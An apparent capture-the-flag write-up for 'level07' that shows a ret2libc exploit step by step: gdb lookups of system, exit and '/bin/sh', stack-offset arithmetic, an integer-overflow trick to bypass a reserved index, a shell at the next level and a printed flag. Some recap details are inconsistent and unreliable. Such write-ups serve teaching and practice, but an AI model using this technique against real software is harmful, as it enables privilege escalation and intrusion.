so the program take 3 argument 
 - store 
 - read 
 - quit


 so actually the goal is to exploit this line :

  *(_DWORD *)(buffer_main + 4 * index) = unum;


  the problem here is because is make a 4 * index is posssible to write everywhere !

  so how to write the addres of the eip ?


and which i iwant to put inside the addres ?

the problem in this chall is this code:

  for (; *argv_local != (char *)0; argv_local++) {
    memset(*argv_local, 0, strlen(*argv_local));
  }
  for (; *env_local != (char *)0x0; env_local++) {
    memset(*env_local, 0, strlen(*env_local));
  }

is delete every env and every arg 

for this reason the only possible exploit is to use ret2libc


is technique that use the already stuff inside the libc to my custom exploit


so what the addres i need :

i use this website for find how to use ret2libc:
https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc



(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr


the the addres of system is 0xf7e6aed0

(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit


and the addres of exit is 0xf7e5eb70

the last things is where is the adress of the string 
/bin/bash
or /bin/sh

the solution is to watch inside the mapping of the libc :


info proc mapping

and after to watch in the range ins the mapping :

(gdb) info proc mapping
process 1767
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fd8000 0xf7fdb000     0x3000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]



so here the addres of the start and the end is know nown :

(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec


the addres is 0xf7f897ec



adress string /bin/sh : 0xf7fd0000
addres exit :0xf7e5eb70
adress of system: 0xf7e6aed0


so know i know wich value i need to put 
but where ?


so the first argument is on 


base of the stack for the return of addres here EBP + 4 to everrie the eip address 
after is need the addres of the return here the enxt EBP + 8 
after i need the adress of the first argument for system here EBP + 12



system -> $ebp + 4
exit   -> $ebp + 8
/bin/sh -> $ebp + 12


(gdb) x/x $ebp + 4
0xffffd71c:     0xf7e45513

(gdb) x/x $ebp + 8
0xffffd720:     0x00000001

(gdb) x/x $ebp + 12
0xffffd724:     0xffffd7b4



the last element is i need index so how to know the adress :
so i look the code source i asm 


lea     eax, [esp+36]
mov     [esp], eax
call    store_number


so the buffer is on addres esp+36

(gdb) x/x $esp+0x24
0xffffd554:     0x00000000




so know i just need to subtract with the value i want 

0xffffd71c - 0xffffd554 =  0x1c8 / 4 = > 114  for $ebp+4  system
0xffffd720 - 0xffffd554 =  0x1cc / 4 = > 115  for $ebp+8  exit
0xffffd724 - 0xffffd554 =  0x1d0 / 4 = > 116  for $ebp+12 argument


with value =>
adress of system      : 0xf7e6aed0 VALUE  4159090384
addres exit           : 0xf7e5eb70 VALUE  4159040368
adress string /bin/sh : 0xf7f897ec VALUE  4160264172



let's trys 
 Number: 4160264172
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: 



but i found this error !
so  acutlly is make * 4 so is juste make bit shift of left of 2

so *4 is same of <<2

so juste make the number with negatif integer by add one bit on bit 32 

so 114 / 4 is now 2147483762
same for the reste 

2147483762   -> 4159090384
115          -> 4159040368
116          -> 4160264172



Input command: store 
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)


=== Flag ===
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

 and found the flag !